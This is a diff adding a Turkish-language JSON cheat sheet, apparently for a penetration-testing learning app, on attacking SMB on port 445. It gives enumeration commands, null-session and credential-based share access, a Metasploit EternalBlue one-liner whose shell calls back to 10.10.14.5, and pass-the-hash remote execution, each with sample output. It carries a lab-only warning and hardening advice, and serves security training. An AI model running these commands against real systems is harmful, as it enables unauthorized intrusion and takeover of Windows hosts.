@@ -1,0 +1,100 @@
+{
+  "port": 445,
+  "service": "SMB",
+  "protocol": "TCP",
+  "description": "Server Message Block — Windows ağ paylaşım protokolü. MS17-010 (EternalBlue), null session ve pass-the-hash gibi kritik saldırı vektörlerine sahip.",
+  "risk": "critical",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "SMB Enumeration",
+      "commands": [
+        {
+          "label": "SMB Versiyon ve Script Taraması",
+          "command": "nmap -sV -p 445 --script smb-os-discovery,smb-security-mode,smb2-security-mode 192.168.1.105",
+          "description": "SMB versiyon, OS, güvenlik modu tespiti",
+          "output": "445/tcp open microsoft-ds Windows 10 Pro 19041\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported"
+        },
+        {
+          "label": "SMBv1 Kontrol (EternalBlue için)",
+          "command": "nmap -p 445 --script smb-vuln-ms17-010 192.168.1.105",
+          "description": "Senaryo: MS17-010 (EternalBlue) zafiyeti var mı?",
+          "output": "| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1",
+          "tip": "VULNERABLE görüntülenirse → EternalBlue ile doğrudan SYSTEM shell mümkün!"
+        },
+        {
+          "label": "Enum4linux ile Tam Enumeration",
+          "command": "enum4linux -a 192.168.1.105",
+          "description": "Kullanıcılar, gruplar, paylaşımlar, şifre politikası",
+          "output": "Users via RPC:\n  Administrator (500)\n  john (1001)\n  guest (501)\n\nShares:\n  public (Disk) - Public Share\n  admin$ (Disk) - Remote Admin"
+        },
+        {
+          "label": "SMBClient ile Paylaşım Listeleme",
+          "command": "smbclient -L //192.168.1.105 -N",
+          "description": "Null session ile paylaşımları listele",
+          "output": "Sharename  Type  Comment\n---------  ----  -------\nIPC$       IPC   IPC Service\npublic     Disk  Public Share"
+        },
+        {
+          "label": "CrackMapExec ile Hızlı SMB Enum",
+          "command": "crackmapexec smb 192.168.1.0/24",
+          "description": "Tüm ağdaki SMB servislerini ve OS'larını listele",
+          "output": "SMB 192.168.1.105 445 WIN-HEDEF [*] Windows 10 Pro x64 (domain:WORKGROUP) (signing:False) (SMBv1:True)"
+        }
+      ]
+    },
+    {
+      "id": "access",
+      "title": "SMB Erişim ve Dosya Transfer",
+      "commands": [
+        {
+          "label": "SMBClient ile Paylaşıma Bağlan",
+          "command": "smbclient //192.168.1.105/public -N",
+          "description": "Senaryo: Public paylaşımına null session ile gir, dosyaları incele",
+          "output": "smb: \\> ls\n  flag.txt  A  1024\nsmb: \\> get flag.txt"
+        },
+        {
+          "label": "Kimlik Bilgisiyle SMB Bağlantısı",
+          "command": "smbclient //192.168.1.105/C$ -U 'admin%password123'",
+          "description": "Senaryo: Ele geçirilen kimlik bilgileriyle C$ admin paylaşımına eriş"
+        },
+        {
+          "label": "SMB Mount",
+          "command": "sudo mount -t cifs //192.168.1.105/public /mnt/smb -o username=admin,password=pass123",
+          "description": "Senaryo: SMB paylaşımını yerel dizine mount et — toplu işlem için",
+          "tip": "Dosya transferi, arama ve analiz için mount çok daha pratiktir."
+        },
+        {
+          "label": "SMBMap ile Paylaşım Analizi",
+          "command": "smbmap -H 192.168.1.105 -u admin -p password123",
+          "description": "Erişilebilir paylaşımları ve izin düzeylerini listele",
+          "output": "Disk           Permissions  Comment\n----           -----------  -------\npublic         READ, WRITE\nC$             READ, WRITE  Default share"
+        }
+      ]
+    },
+    {
+      "id": "exploit",
+      "title": "SMB Exploitler — EternalBlue ve PtH",
+      "commands": [
+        {
+          "label": "EternalBlue — MS17-010 (Metasploit)",
+          "command": "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.105; set LHOST 10.10.14.5; run\"",
+          "description": "Senaryo: SMBv1 açık Windows 7/Server 2008 R2 → SYSTEM shell",
+          "output": "[+] 192.168.1.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.1.105:445 - =-=-=-=-=-=-=-=-=-= WIN -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.1.105:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[*] Meterpreter session 1 opened\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM",
+          "warning": "YALNIZCA HackTheBox/TryHackMe gibi yetkili lab ortamlarında kullanın."
+        },
+        {
+          "label": "Pass-the-Hash (CrackMapExec)",
+          "command": "crackmapexec smb 192.168.1.105 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'",
+          "description": "Senaryo: NTLM hash ile parola gerekmeden kimlik doğrulaması",
+          "output": "SMB 192.168.1.105 445 WIN-HEDEF [+] Administrator:aad3... (Pwn3d!)"
+        },
+        {
+          "label": "PsExec ile Shell (CrackMapExec)",
+          "command": "crackmapexec smb 192.168.1.105 -u Administrator -H 'LM:NT' -x 'whoami'",
+          "description": "Senaryo: Hash ile uzak komut çalıştırma"
+        }
+      ]
+    }
+  ],
+  "defenseNote": "SMB güvenlik önlemleri: SMBv1'i tamamen devre dışı bırakın: Set-SmbServerConfiguration -EnableSMB1Protocol $false. MS17-010 patch'ini uygulayın (KB4012212). SMB'yi internete açmayın — firewall ile 445 portunu sadece iç ağ içi açık tutun. Null session'ı devre dışı bırakın (RestrictAnonymous=2). SMB signing'i zorunlu kılın. Windows Defender Credential Guard ile hash çalmayı zorlaştırın."
+}
